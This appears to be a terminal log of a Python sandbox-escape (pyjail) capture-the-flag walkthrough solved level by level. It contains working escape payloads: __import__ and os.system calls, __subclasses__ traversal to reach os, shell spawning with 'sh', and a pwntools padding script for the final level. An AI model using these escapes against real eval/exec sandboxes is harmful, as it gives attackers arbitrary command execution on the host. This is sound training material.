$ python3 level-0.py 

                               _                _ 
                              | | _____   _____| |
                              | |/ _ \ \ / / _ \ |
                              | |  __/\ V /  __/ |
                              |_|\___| \_/ \___|_|

                                
                               _______ _ __ ___  
                              |_  / _ \ '__/ _ \ 
                               / /  __/ | | (_) |
                              /___\___|_|  \___/ 

Welcome to your doom!!!

Protections:
None

>>> import os;os.system("whoami")
sand_xcaper

###

$ python3 level-1.py 

                               _                _ 
                              | | _____   _____| |
                              | |/ _ \ \ / / _ \ |
                              | |  __/\ V /  __/ |
                              |_|\___| \_/ \___|_|

                         
                                 ___  _ __   ___ 
                                / _ \| '_ \ / _ \
                               | (_) | | | |  __/
                                \___/|_| |_|\___|

Welcome to your doom!!!

Protections:
eval() instead of exec()

>>> __import__("os").system("whoami")
sand_xcaper
0

###

$ python3 level-2.py 

                               _                _ 
                              | | _____   _____| |
                              | |/ _ \ \ / / _ \ |
                              | |  __/\ V /  __/ |
                              |_|\___| \_/ \___|_|


                               _                 
                              | |___      _____  
                              | __\ \ /\ / / _ \ 
                              | |_ \ V  V / (_) |
                               \__| \_/\_/ \___/ 

Welcome to your doom!!!

Protections:
You can't start a line with "import" (after stripping whitespace)

>>> print(eval(input()))
__import__("os").system("whoami")
sand_xcaper
0
None

###

$ python3 level-3.py 

                               _                _ 
                              | | _____   _____| |
                              | |/ _ \ \ / / _ \ |
                              | |  __/\ V /  __/ |
                              |_|\___| \_/ \___|_|


                            _   _                   
                           | |_| |__  _ __ ___  ___ 
                           | __| '_ \| '__/ _ \/ _ \
                           | |_| | | | | |  __/  __/
                            \__|_| |_|_|  \___|\___|

Welcome to your doom!!!

Protections:
eval() instead of exec()
You can't say "import" at all!

>>> print(eval(input()))
__import__("os").system("whoami")
sand_xcaper
0
None

###

$ python3 level-4.py 

                               _                _ 
                              | | _____   _____| |
                              | |/ _ \ \ / / _ \ |
                              | |  __/\ V /  __/ |
                              |_|\___| \_/ \___|_|


                               __                  
                              / _| ___  _   _ _ __ 
                             | |_ / _ \| | | | '__|
                             |  _| (_) | |_| | |   
                             |_|  \___/ \__,_|_|   

Welcome to your doom!!!

Protections:
I deleted __import__ from __builtins__ (but I made a backup...)
eval() instad of exec()

>>> print(dir())
['__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'cmd', 'intro', 'readline', 'suspicious']
None
>>> [print(dir(i),"\n") for i in range(12)]
['__abs__', '__add__', '__and__', '__bool__', '__ceil__', '__class__', '__delattr__', '__dir__', '__divmod__', '__doc__', '__eq__', '__float__', '__floor__', '__floordiv__', '__format__', '__ge__', '__getattribute__', '__getnewargs__', '__gt__', '__hash__', '__index__', '__init__', '__init_subclass__', '__int__', '__invert__', '__le__', '__lshift__', '__lt__', '__mod__', '__mul__', '__ne__', '__neg__', '__new__', '__or__', '__pos__', '__pow__', '__radd__', '__rand__', '__rdivmod__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rlshift__', '__rmod__', '__rmul__', '__ror__', '__round__', '__rpow__', '__rrshift__', '__rshift__', '__rsub__', '__rtruediv__', '__rxor__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '__trunc__', '__xor__', 'as_integer_ratio', 'bit_count', 'bit_length', 'conjugate', 'denominator', 'from_bytes', 'imag', 'numerator', 'real', 'to_bytes'] 

['__abs__', '__add__', '__and__', '__bool__', '__ceil__', '__class__', '__delattr__', '__dir__', '__divmod__', '__doc__', '__eq__', '__float__', '__floor__', '__floordiv__', '__format__', '__ge__', '__getattribute__', '__getnewargs__', '__gt__', '__hash__', '__index__', '__init__', '__init_subclass__', '__int__', '__invert__', '__le__', '__lshift__', '__lt__', '__mod__', '__mul__', '__ne__', '__neg__', '__new__', '__or__', '__pos__', '__pow__', '__radd__', '__rand__', '__rdivmod__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rlshift__', '__rmod__', '__rmul__', '__ror__', '__round__', '__rpow__', '__rrshift__', '__rshift__', '__rsub__', '__rtruediv__', '__rxor__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '__trunc__', '__xor__', 'as_integer_ratio', 'bit_count', 'bit_length', 'conjugate', 'denominator', 'from_bytes', 'imag', 'numerator', 'real', 'to_bytes'] 

['__abs__', '__add__', '__and__', '__bool__', '__ceil__', '__class__', '__delattr__', '__dir__', '__divmod__', '__doc__', '__eq__', '__float__', '__floor__', '__floordiv__', '__format__', '__ge__', '__getattribute__', '__getnewargs__', '__gt__', '__hash__', '__index__', '__init__', '__init_subclass__', '__int__', '__invert__', '__le__', '__lshift__', '__lt__', '__mod__', '__mul__', '__ne__', '__neg__', '__new__', '__or__', '__pos__', '__pow__', '__radd__', '__rand__', '__rdivmod__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rlshift__', '__rmod__', '__rmul__', '__ror__', '__round__', '__rpow__', '__rrshift__', '__rshift__', '__rsub__', '__rtruediv__', '__rxor__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '__trunc__', '__xor__', 'as_integer_ratio', 'bit_count', 'bit_length', 'conjugate', 'denominator', 'from_bytes', 'imag', 'numerator', 'real', 'to_bytes'] 

['__abs__', '__add__', '__and__', '__bool__', '__ceil__', '__class__', '__delattr__', '__dir__', '__divmod__', '__doc__', '__eq__', '__float__', '__floor__', '__floordiv__', '__format__', '__ge__', '__getattribute__', '__getnewargs__', '__gt__', '__hash__', '__index__', '__init__', '__init_subclass__', '__int__', '__invert__', '__le__', '__lshift__', '__lt__', '__mod__', '__mul__', '__ne__', '__neg__', '__new__', '__or__', '__pos__', '__pow__', '__radd__', '__rand__', '__rdivmod__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rlshift__', '__rmod__', '__rmul__', '__ror__', '__round__', '__rpow__', '__rrshift__', '__rshift__', '__rsub__', '__rtruediv__', '__rxor__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '__trunc__', '__xor__', 'as_integer_ratio', 'bit_count', 'bit_length', 'conjugate', 'denominator', 'from_bytes', 'imag', 'numerator', 'real', 'to_bytes'] 

['__abs__', '__add__', '__and__', '__bool__', '__ceil__', '__class__', '__delattr__', '__dir__', '__divmod__', '__doc__', '__eq__', '__float__', '__floor__', '__floordiv__', '__format__', '__ge__', '__getattribute__', '__getnewargs__', '__gt__', '__hash__', '__index__', '__init__', '__init_subclass__', '__int__', '__invert__', '__le__', '__lshift__', '__lt__', '__mod__', '__mul__', '__ne__', '__neg__', '__new__', '__or__', '__pos__', '__pow__', '__radd__', '__rand__', '__rdivmod__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rlshift__', '__rmod__', '__rmul__', '__ror__', '__round__', '__rpow__', '__rrshift__', '__rshift__', '__rsub__', '__rtruediv__', '__rxor__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '__trunc__', '__xor__', 'as_integer_ratio', 'bit_count', 'bit_length', 'conjugate', 'denominator', 'from_bytes', 'imag', 'numerator', 'real', 'to_bytes'] 

['__abs__', '__add__', '__and__', '__bool__', '__ceil__', '__class__', '__delattr__', '__dir__', '__divmod__', '__doc__', '__eq__', '__float__', '__floor__', '__floordiv__', '__format__', '__ge__', '__getattribute__', '__getnewargs__', '__gt__', '__hash__', '__index__', '__init__', '__init_subclass__', '__int__', '__invert__', '__le__', '__lshift__', '__lt__', '__mod__', '__mul__', '__ne__', '__neg__', '__new__', '__or__', '__pos__', '__pow__', '__radd__', '__rand__', '__rdivmod__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rlshift__', '__rmod__', '__rmul__', '__ror__', '__round__', '__rpow__', '__rrshift__', '__rshift__', '__rsub__', '__rtruediv__', '__rxor__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '__trunc__', '__xor__', 'as_integer_ratio', 'bit_count', 'bit_length', 'conjugate', 'denominator', 'from_bytes', 'imag', 'numerator', 'real', 'to_bytes'] 

['__abs__', '__add__', '__and__', '__bool__', '__ceil__', '__class__', '__delattr__', '__dir__', '__divmod__', '__doc__', '__eq__', '__float__', '__floor__', '__floordiv__', '__format__', '__ge__', '__getattribute__', '__getnewargs__', '__gt__', '__hash__', '__index__', '__init__', '__init_subclass__', '__int__', '__invert__', '__le__', '__lshift__', '__lt__', '__mod__', '__mul__', '__ne__', '__neg__', '__new__', '__or__', '__pos__', '__pow__', '__radd__', '__rand__', '__rdivmod__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rlshift__', '__rmod__', '__rmul__', '__ror__', '__round__', '__rpow__', '__rrshift__', '__rshift__', '__rsub__', '__rtruediv__', '__rxor__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '__trunc__', '__xor__', 'as_integer_ratio', 'bit_count', 'bit_length', 'conjugate', 'denominator', 'from_bytes', 'imag', 'numerator', 'real', 'to_bytes'] 

['__abs__', '__add__', '__and__', '__bool__', '__ceil__', '__class__', '__delattr__', '__dir__', '__divmod__', '__doc__', '__eq__', '__float__', '__floor__', '__floordiv__', '__format__', '__ge__', '__getattribute__', '__getnewargs__', '__gt__', '__hash__', '__index__', '__init__', '__init_subclass__', '__int__', '__invert__', '__le__', '__lshift__', '__lt__', '__mod__', '__mul__', '__ne__', '__neg__', '__new__', '__or__', '__pos__', '__pow__', '__radd__', '__rand__', '__rdivmod__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rlshift__', '__rmod__', '__rmul__', '__ror__', '__round__', '__rpow__', '__rrshift__', '__rshift__', '__rsub__', '__rtruediv__', '__rxor__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '__trunc__', '__xor__', 'as_integer_ratio', 'bit_count', 'bit_length', 'conjugate', 'denominator', 'from_bytes', 'imag', 'numerator', 'real', 'to_bytes'] 

['__abs__', '__add__', '__and__', '__bool__', '__ceil__', '__class__', '__delattr__', '__dir__', '__divmod__', '__doc__', '__eq__', '__float__', '__floor__', '__floordiv__', '__format__', '__ge__', '__getattribute__', '__getnewargs__', '__gt__', '__hash__', '__index__', '__init__', '__init_subclass__', '__int__', '__invert__', '__le__', '__lshift__', '__lt__', '__mod__', '__mul__', '__ne__', '__neg__', '__new__', '__or__', '__pos__', '__pow__', '__radd__', '__rand__', '__rdivmod__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rlshift__', '__rmod__', '__rmul__', '__ror__', '__round__', '__rpow__', '__rrshift__', '__rshift__', '__rsub__', '__rtruediv__', '__rxor__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '__trunc__', '__xor__', 'as_integer_ratio', 'bit_count', 'bit_length', 'conjugate', 'denominator', 'from_bytes', 'imag', 'numerator', 'real', 'to_bytes'] 

['__abs__', '__add__', '__and__', '__bool__', '__ceil__', '__class__', '__delattr__', '__dir__', '__divmod__', '__doc__', '__eq__', '__float__', '__floor__', '__floordiv__', '__format__', '__ge__', '__getattribute__', '__getnewargs__', '__gt__', '__hash__', '__index__', '__init__', '__init_subclass__', '__int__', '__invert__', '__le__', '__lshift__', '__lt__', '__mod__', '__mul__', '__ne__', '__neg__', '__new__', '__or__', '__pos__', '__pow__', '__radd__', '__rand__', '__rdivmod__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rlshift__', '__rmod__', '__rmul__', '__ror__', '__round__', '__rpow__', '__rrshift__', '__rshift__', '__rsub__', '__rtruediv__', '__rxor__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '__trunc__', '__xor__', 'as_integer_ratio', 'bit_count', 'bit_length', 'conjugate', 'denominator', 'from_bytes', 'imag', 'numerator', 'real', 'to_bytes'] 

['__abs__', '__add__', '__and__', '__bool__', '__ceil__', '__class__', '__delattr__', '__dir__', '__divmod__', '__doc__', '__eq__', '__float__', '__floor__', '__floordiv__', '__format__', '__ge__', '__getattribute__', '__getnewargs__', '__gt__', '__hash__', '__index__', '__init__', '__init_subclass__', '__int__', '__invert__', '__le__', '__lshift__', '__lt__', '__mod__', '__mul__', '__ne__', '__neg__', '__new__', '__or__', '__pos__', '__pow__', '__radd__', '__rand__', '__rdivmod__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rlshift__', '__rmod__', '__rmul__', '__ror__', '__round__', '__rpow__', '__rrshift__', '__rshift__', '__rsub__', '__rtruediv__', '__rxor__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '__trunc__', '__xor__', 'as_integer_ratio', 'bit_count', 'bit_length', 'conjugate', 'denominator', 'from_bytes', 'imag', 'numerator', 'real', 'to_bytes'] 

['__abs__', '__add__', '__and__', '__bool__', '__ceil__', '__class__', '__delattr__', '__dir__', '__divmod__', '__doc__', '__eq__', '__float__', '__floor__', '__floordiv__', '__format__', '__ge__', '__getattribute__', '__getnewargs__', '__gt__', '__hash__', '__index__', '__init__', '__init_subclass__', '__int__', '__invert__', '__le__', '__lshift__', '__lt__', '__mod__', '__mul__', '__ne__', '__neg__', '__new__', '__or__', '__pos__', '__pow__', '__radd__', '__rand__', '__rdivmod__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rlshift__', '__rmod__', '__rmul__', '__ror__', '__round__', '__rpow__', '__rrshift__', '__rshift__', '__rsub__', '__rtruediv__', '__rxor__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '__trunc__', '__xor__', 'as_integer_ratio', 'bit_count', 'bit_length', 'conjugate', 'denominator', 'from_bytes', 'imag', 'numerator', 'real', 'to_bytes'] 

[None, None, None, None, None, None, None, None, None, None, None, None]
>>> [print(().__class__.__base__.__subclasses__()[i],"\n") for i in range(200)]
<class 'type'> 

<class 'async_generator'> 

<class 'int'> 

<class 'bytearray_iterator'> 

<class 'bytearray'> 

<class 'bytes_iterator'> 

<class 'bytes'> 

<class 'builtin_function_or_method'> 

<class 'callable_iterator'> 

<class 'PyCapsule'> 

<class 'cell'> 

<class 'classmethod_descriptor'> 

<class 'classmethod'> 

<class 'code'> 

<class 'complex'> 

<class 'coroutine'> 

<class 'dict_items'> 

<class 'dict_itemiterator'> 

<class 'dict_keyiterator'> 

<class 'dict_valueiterator'> 

<class 'dict_keys'> 

<class 'mappingproxy'> 

<class 'dict_reverseitemiterator'> 

<class 'dict_reversekeyiterator'> 

<class 'dict_reversevalueiterator'> 

<class 'dict_values'> 

<class 'dict'> 

<class 'ellipsis'> 

<class 'enumerate'> 

<class 'float'> 

<class 'frame'> 

<class 'frozenset'> 

<class 'function'> 

<class 'generator'> 

<class 'getset_descriptor'> 

<class 'instancemethod'> 

<class 'list_iterator'> 

<class 'list_reverseiterator'> 

<class 'list'> 

<class 'longrange_iterator'> 

<class 'member_descriptor'> 

<class 'memoryview'> 

<class 'method_descriptor'> 

<class 'method'> 

<class 'moduledef'> 

<class 'module'> 

<class 'odict_iterator'> 

<class 'pickle.PickleBuffer'> 

<class 'property'> 

<class 'range_iterator'> 

<class 'range'> 

<class 'reversed'> 

<class 'symtable entry'> 

<class 'iterator'> 

<class 'set_iterator'> 

<class 'set'> 

<class 'slice'> 

<class 'staticmethod'> 

<class 'stderrprinter'> 

<class 'super'> 

<class 'traceback'> 

<class 'tuple_iterator'> 

<class 'tuple'> 

<class 'str_iterator'> 

<class 'str'> 

<class 'wrapper_descriptor'> 

<class 'types.GenericAlias'> 

<class 'anext_awaitable'> 

<class 'async_generator_asend'> 

<class 'async_generator_athrow'> 

<class 'async_generator_wrapped_value'> 

<class 'coroutine_wrapper'> 

<class 'InterpreterID'> 

<class 'managedbuffer'> 

<class 'method-wrapper'> 

<class 'types.SimpleNamespace'> 

<class 'NoneType'> 

<class 'NotImplementedType'> 

<class 'weakref.CallableProxyType'> 

<class 'weakref.ProxyType'> 

<class 'weakref.ReferenceType'> 

<class 'types.UnionType'> 

<class 'EncodingMap'> 

<class 'fieldnameiterator'> 

<class 'formatteriterator'> 

<class 'BaseException'> 

<class 'hamt'> 

<class 'hamt_array_node'> 

<class 'hamt_bitmap_node'> 

<class 'hamt_collision_node'> 

<class 'keys'> 

<class 'values'> 

<class 'items'> 

<class '_contextvars.Context'> 

<class '_contextvars.ContextVar'> 

<class '_contextvars.Token'> 

<class 'Token.MISSING'> 

<class 'filter'> 

<class 'map'> 

<class 'zip'> 

<class '_frozen_importlib._ModuleLock'> 

<class '_frozen_importlib._DummyModuleLock'> 

<class '_frozen_importlib._ModuleLockManager'> 

<class '_frozen_importlib.ModuleSpec'> 

<class '_frozen_importlib.BuiltinImporter'> 

<class '_frozen_importlib.FrozenImporter'> 

<class '_frozen_importlib._ImportLockContext'> 

<class '_thread.lock'> 

<class '_thread.RLock'> 

<class '_thread._localdummy'> 

<class '_thread._local'> 

<class '_io._IOBase'> 

<class '_io._BytesIOBuffer'> 

<class '_io.IncrementalNewlineDecoder'> 

<class 'posix.ScandirIterator'> 

<class 'posix.DirEntry'> 

<class '_frozen_importlib_external.WindowsRegistryFinder'> 

<class '_frozen_importlib_external._LoaderBasics'> 

<class '_frozen_importlib_external.FileLoader'> 

<class '_frozen_importlib_external._NamespacePath'> 

<class '_frozen_importlib_external._NamespaceLoader'> 

<class '_frozen_importlib_external.PathFinder'> 

<class '_frozen_importlib_external.FileFinder'> 

<class 'codecs.Codec'> 

<class 'codecs.IncrementalEncoder'> 

<class 'codecs.IncrementalDecoder'> 

<class 'codecs.StreamReaderWriter'> 

<class 'codecs.StreamRecoder'> 

<class '_abc._abc_data'> 

<class 'abc.ABC'> 

<class 'collections.abc.Hashable'> 

<class 'collections.abc.Awaitable'> 

<class 'collections.abc.AsyncIterable'> 

<class 'collections.abc.Iterable'> 

<class 'collections.abc.Sized'> 

<class 'collections.abc.Container'> 

<class 'collections.abc.Callable'> 

<class 'os._wrap_close'>  #137 : <class 'os._wrap_close'> 

<class '_sitebuiltins.Quitter'> 

<class '_sitebuiltins._Printer'> 

<class '_sitebuiltins._Helper'> 

Error  list index out of range
>>>

$ python3 level-4.py 

                               _                _ 
                              | | _____   _____| |
                              | |/ _ \ \ / / _ \ |
                              | |  __/\ V /  __/ |
                              |_|\___| \_/ \___|_|


                               __                  
                              / _| ___  _   _ _ __ 
                             | |_ / _ \| | | | '__|
                             |  _| (_) | |_| | |   
                             |_|  \___/ \__,_|_|   

Welcome to your doom!!!

Protections:
I deleted __import__ from __builtins__ (but I made a backup...)
eval() instad of exec()

>>> print(dir(suspicious))
['__call__', '__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__text_signature__']
None
>>> [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer']
>>> [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("whoami")
sand_xcaper
0
>>> 


###

$ python3 level-5.py 

                               _                _ 
                              | | _____   _____| |
                              | |/ _ \ \ / / _ \ |
                              | |  __/\ V /  __/ |
                              |_|\___| \_/ \___|_|


                                 __ _           
                                / _(_)_   _____ 
                               | |_| \ \ / / _ \
                               |  _| |\ V /  __/
                               |_| |_| \_/ \___|

Welcome to your doom!!!

Protections:
I deleted __import__ from __builtins__ (but I made a backup...)
You're not allowed to say "vars", "locals", or "globals"
eval() instad of exec()

>>> exec(input())
what_a_weird_variable("os").system("sh")
$ ls
jail.py  jail.pyc  level-0.py  level-1.py  level-2.py  level-3.py  level-4.py  level-5.py  level-6.py  level-7.py  level-8.py  level-doom.py  __pycache__  solutions.txt  xpl_doom.py
$ 

###

$ python3 level-6.py 

                               _                _ 
                              | | _____   _____| |
                              | |/ _ \ \ / / _ \ |
                              | |  __/\ V /  __/ |
                              |_|\___| \_/ \___|_|


                                       _      
                                   ___(_)_  __
                                  / __| \ \/ /
                                  \__ \ |>  < 
                                  |___/_/_/\_\

Welcome to your doom!!!

Protections:
I will only accept 16 bytes of input at a time.
eval() instead of exec()

>>> exec(input())
import os;os.system("whoami")
sand_xcaper
None
>>> 

###

$ python3 level-7.py 

                               _                _ 
                              | | _____   _____| |
                              | |/ _ \ \ / / _ \ |
                              | |  __/\ V /  __/ |
                              |_|\___| \_/ \___|_|

                 
                            ___  _____   _____ _ __  
                           / __|/ _ \ \ / / _ \ '_ \ 
                           \__ \  __/\ V /  __/ | | |
                           |___/\___| \_/ \___|_| |_|

Welcome to your doom!!!

Protections:
I do not like strings. You may not type " or '
eval() instead of exec()

>>> print(dir())
['__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'cmd', 'intro', 're', 'readline']
None
>>> exec(input())
import os;os.system("whoami")
sand_xcaper
None

###

$ python3 level-8.py 

                               _                _ 
                              | | _____   _____| |
                              | |/ _ \ \ / / _ \ |
                              | |  __/\ V /  __/ |
                              |_|\___| \_/ \___|_|


                                  _       _     _   
                              ___(_) __ _| |__ | |_ 
                             / _ \ |/ _` | '_ \| __|
                            |  __/ | (_| | | | | |_ 
                             \___|_|\__, |_| |_|\__|
                                    |___/           

Welcome to your doom!!!

Protections:
I'll let you out if you call escape() with the key!

>>> print(dir())
['__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'cmd', 'escape', 'intro', 're', 'readline']
None
>>> print(globals())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f296f81d420>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/sand_xcaper/python_sand/pyjails/python/level-8.py', '__cached__': None, 'readline': <module 'readline' from '/usr/lib/python3.10/lib-dynload/readline.cpython-310-x86_64-linux-gnu.so'>, 're': <module 're' from '/usr/lib/python3.10/re.py'>, 'intro': <function intro at 0x7f296f69dcf0>, 'escape': <function escape at 0x7f296f8860e0>, 'cmd': 'print(globals())'}
None
>>> print(dir(escape))
['__annotations__', '__builtins__', '__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get__', '__getattribute__', '__globals__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__kwdefaults__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__qualname__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
None
>>> open(__file__).read()
#! /usr/bin/python3

import readline
import re
from jail import intro

import os

def escape(key):
    if key == "swordfish":
        os.system("sh")
    else:
        print("NOPE!")

del os

print(intro(8))

print("Welcome to your doom!!!")
print()
print("Protections:")
print("I'll let you out if you call escape() with the key!")
print()

while True:
    try:
        cmd = input(">>> ")
        print(eval(cmd))
    except EOFError:
        exit()
    except Exception as e:
        print("Error ", e)


#if we try escape("swordfish") it will not execute because os was deleted, so we just reimport is with exec
#So...

$ python3 level-8.py 

                               _                _ 
                              | | _____   _____| |
                              | |/ _ \ \ / / _ \ |
                              | |  __/\ V /  __/ |
                              |_|\___| \_/ \___|_|


                                  _       _     _   
                              ___(_) __ _| |__ | |_ 
                             / _ \ |/ _` | '_ \| __|
                            |  __/ | (_| | | | | |_ 
                             \___|_|\__, |_| |_|\__|
                                    |___/           

Welcome to your doom!!!

Protections:
I'll let you out if you call escape() with the key!

>>> exec(input())
import os;escape("swordfish")
$ ls
jail.py  level-0.py  level-1.py  level-2.py  level-3.py  level-4.py  level-5.py  level-6.py  level-7.py  level-8.py  level-doom.py  __pycache__  solutions.txt
$ id
uid=1000(sand_xcaper) gid=1000(sand_xcaper) groups=1000(sand_xcaper),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)
$ 

###

Protections:
I deleted EVERYTHING in __builtins__
Input must be EXACTLY 32 characters long (excluding the newline, after stripping)
You can't say "exec"

>>> print(dir())
That wasn't exactly 32 characters

#so if our input isn't 32 chars it will not be passed to exec, to subdue this i will do a script that generates a string everytime that fit exactly to be 32 bytes
#Here is the basic script
'''
from pwn import *
import time
io = process(['python3','level-doom.py'])
while True:
	leng = 32
	cmd = input("$> ")
	start = "a="
	end = ";"
	ris = leng-len(cmd)-len(start)-len(end)-1
	gen = "'"+"A"*ris+"'"
	payload = start + gen + end + cmd
	info(payload)
	time.sleep(1)
	io.sendline(payload)
	print(io.recv(1024))

'''
